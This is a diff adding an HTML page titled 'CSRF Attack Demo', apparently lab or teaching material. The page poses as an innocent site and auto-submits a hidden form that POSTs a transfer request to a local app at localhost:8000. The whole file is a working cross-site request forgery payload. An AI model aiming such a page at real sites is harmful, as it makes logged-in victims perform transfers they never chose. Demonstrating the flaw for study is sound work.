@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+    <h1>Innocent Website</h1>
+    <p>Loading content...</p>
+    
+    <!-- Hidden CSRF attack form -->
+    <form id="csrf-attack" action="http://localhost:8000/transfer/1/" method="post" style="display:none;">
+        <input type="hidden" name="recipient" value="2">
+    </form>
+    
+    <script>
+        // Execute CSRF attack after 1 second
+        setTimeout(function() {
+            document.getElementById('csrf-attack').submit();
+        }, 1000);
+    </script>
+</body>
+</html>
